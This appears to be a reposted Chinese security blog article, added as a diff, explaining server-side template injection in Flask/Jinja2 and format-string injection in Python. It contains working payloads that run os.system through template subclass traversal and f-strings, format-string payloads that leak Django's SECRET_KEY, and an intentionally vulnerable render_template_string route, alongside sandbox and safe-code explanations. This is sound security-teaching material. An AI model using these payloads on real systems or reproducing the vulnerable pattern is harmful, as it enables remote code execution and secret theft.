@@ -1,0 +1,83 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>原文地址：<a href="https://www.cdxy.me/?p=738" target="_blank">https://www.cdxy.me/?p=738</a></p>
+<h2 data-content="1" id="4c6c99d5bacbcc79f07823f1183972e2">Template Injection</h2>
+<p>之前两篇曝光率很高的文章中指出了Flask SSTI成因及利用方式</p>
+<ol>
+<li><a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/" target="_blank">exploring-ssti-in-flask-jinja2</a></li>
+<li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/" target="_blank">exploring-ssti-in-flask-jinja2-part-ii</a></li>
+</ol>
+<p>文中已指出利用方式，事实上使用<code>__class__.__base__.subclasses__</code>可以直接执行命令。</p>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+  {% if c.__name__ == 'catch_warnings' %}
+    {{c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
+  {% endif %}
+{% endfor %}</code></pre>
+<h3 data-content="1" id="41bdd75662b7ef6ba8c3f0581e0d7a6d">jinja2-sandbox</h3>
+<p>开发者可以使用它降低SSTI风险。</p>
+<p>漏洞测试代码：</p>
+<pre><code>import sys
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment()
+    print env.from_string('[Output] {}'.format(sys.argv[1] if len(sys.argv) &gt; 1 else &lt;empty&gt;)).render()</code></pre>
+<p>运行时过滤器将会阻断上述exp执行，爆出安全错误。</p>
+<p>原因在于sandbox对private-attributes进行了过滤。</p>
+<p>jinja2/sandbox.py</p>
+<pre><code>def is_safe_attribute(self, obj, attr, value):
+    return not (attr.startswith('_') or is_internal_attribute(obj, attr))</code></pre>
+<p>其中<code>is_internal_attribute</code>函数黑名单如下：</p>
+<pre><code>UNSAFE_FUNCTION_ATTRIBUTES = set(['func_closure', 'func_code', 'func_dict','func_defaults', 'func_globals'])
+
+UNSAFE_METHOD_ATTRIBUTES = set(['im_class', 'im_func', 'im_self'])
+
+UNSAFE_GENERATOR_ATTRIBUTES = set(['gi_frame', 'gi_code'])</code></pre>
+<h3 data-content="1" id="2086c2e4ba69de1e5e64527656c32484">黑盒</h3>
+<p>此种漏洞黑盒思路和sql注入大同小异，关于自动化攻击也可以直接照搬sqlmap，搜集整理各种模板的payload加入工具即可，也可使用一些技巧如DNS、被动式扫描等。</p>
+<h3 data-content="1" id="f120c900b613241618afd34629836091">白盒</h3>
+<p>从白盒角度来看，Python网站出现这种漏洞情况应该不多，事实上，只有将用户可控区域传入模板渲染函数时，或者说只有当开发者将模板写到视图文件中，才可触发。</p>
+<p>这种开发风格是明显不被认可的，目前以我的开发经验还未遇见需要在渲染之前“动态生成模板”的需求。</p>
+<p>代码示例：</p>
+<pre><code>@app.route('/1')
+def main1():
+    template = '''{%% extends "base.html" %%}
+{%% block body %%}
+    &lt;div class="center-content error"&gt;
+        &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;
+        &lt;h3&gt;%s&lt;/h3&gt;
+    &lt;/div&gt;
+{%% endblock %%}
+''' % (request.url)
+    return render_template_string(template, dir=dir, help=help, locals=locals)</code></pre>
+<p>而一般情况下，无论是Flask还是Django，开发者都会将模板内容写入固定文件夹，与视图代码分离，以下例子均为安全代码。</p>
+<p>Flask:</p>
+<pre><code>@app.route('/')
+def safe():
+    return render_template('home.html', url=request.args.get('p'))</code></pre>
+<p>Django:</p>
+<pre><code>def home(request):
+    return render(request, 'home.html', {#DATA#})
+
+class MyView(TemplateView):
+    template_name = 'home.html'
+    def get_context_data():
+        #DATA#</code></pre>
+<h2 data-content="1" id="46c6489a9da6c697c031bc8c4cfe4529">Format Injection</h2>
+<p>根据可控格式化字符串造成的注入点，可导致上下文环境的变量读取，进而泄露敏感内容。</p>
+<ul>
+<li><a href="https://xianzhi.aliyun.com/forum/read/615.html">https://xianzhi.aliyun.com/forum/read/615.html</a></li>
+<li><a href="https://virusdefender.net/index.php/archives/761/" target="_blank">https://virusdefender.net/index.php/archives/761/</a></li>
+</ul>
+<p>python 2/3以下常规用法中<code>format_string</code>处可控，即可触发漏洞。</p>
+<pre><code>format_string % ()
+format_string.format()</code></pre>
+<p>此外Python 3.6新增f函数可导致命令执行</p>
+<pre><code>f'''{__import__('os').system('id')}'''</code></pre>
+<h3 data-content="1" id="bbe63e5f63d6837f0223412ed8aaada1">黑盒</h3>
+<p>可添加针对该类问题的payload</p>
+<pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
+
+{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre>
+<p>如有其他可关注的触发点及利用方式，欢迎留言</p>
+</div>
+</div>
